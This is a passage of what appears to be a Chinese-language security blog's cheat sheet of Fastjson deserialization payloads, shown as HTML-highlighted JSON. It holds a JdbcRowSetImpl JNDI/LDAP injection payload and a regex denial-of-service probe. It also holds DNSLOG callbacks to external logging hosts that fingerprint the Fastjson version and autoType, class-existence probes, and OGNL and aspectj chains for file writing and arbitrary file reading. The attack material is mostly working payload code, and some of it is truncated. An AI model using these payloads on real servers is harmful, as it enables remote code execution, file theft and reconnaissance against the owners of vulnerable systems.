class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:808/badNameClass&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通用payload,可用于parseObject的场景</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:8088/badNameClass&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Fastjson 1.2.36 - 1.2.62<br>利用正则dos洞，进行探测。逐步加a,直到延迟为止</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;regex&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[blue rlike &#x27;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x27;]&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;blue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaaaaaaaaaaa!&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>参考<a href="https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA">https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA</a></p><h3 id="异常回显"><a href="#异常回显" class="headerlink" title="异常回显"></a>异常回显</h3><p>异常回显 fastjson 精确版本号</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h3><p>主要是利用各个类被加入黑名单的方式进行判断，但此方法准确性不高。<br>原理重点关注MiscCodec处理时会去nwe URL，然后通过后面的map#put触发计算key的hash。学习urldns链容易理解。</p><p>fastjson &lt;1.2.43</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson &lt;1.2.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson &lt;1.2.68</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://dnslog&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>精确探索autoType是否开启，开启后能打更多payload<br><a href="https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson">https://github.com/pen4uin/awesome-java-security/tree/main/alibaba fastjson</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.CookiePolicy&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ydk3cz.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><h3 id="关键rce版本探测"><a href="#关键rce版本探测" class="headerlink" title="关键rce版本探测"></a>关键rce版本探测</h3><p>1.2.24 版本，用上面的延时探测即可<br>1.2.47 版本</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dnslog&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>1.2.68版本</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dnslog&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>1.2.80 版本探测 如果收到了两个 dns 请求，则证明使用了 1.2.83 版本 如果收到了一个 dns 请求，则证明使用了 1.2.80 版本</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>      <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;first.dnslog.cn&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>      <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;second.dnslog.cn&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><h2 id="探测环境"><a href="#探测环境" class="headerlink" title="探测环境"></a>探测环境</h2><ul><li>org.springframework.web.bind.annotation.RequestMapping</li><li>org.apache.catalina.startup.Tomcat</li><li>groovy.lang.GroovyShell</li><li>com.mysql.jdbc.Driver</li><li>java.net.http.HttpClient</li></ul><p>如果系统存在这个类，会返回一个类实例，如果不存在会返回 null</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;z&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;z&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.http.HttpClient&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通过使用 Character 将报错回显在 message 中</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Character&quot;</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通过使用 DNSLOG 来探测依赖库</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;groovy.lang.GroovyShell&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;country&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;gv.su18.dnslog.pw&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>文件写，结合 commons-io 代码（stream 里面写 68 的 payload）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;_evaluation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>aspectj + ognl 任意文件读取 + DNSLOG 回显<br>打入白名单</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>         <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><br>      <span 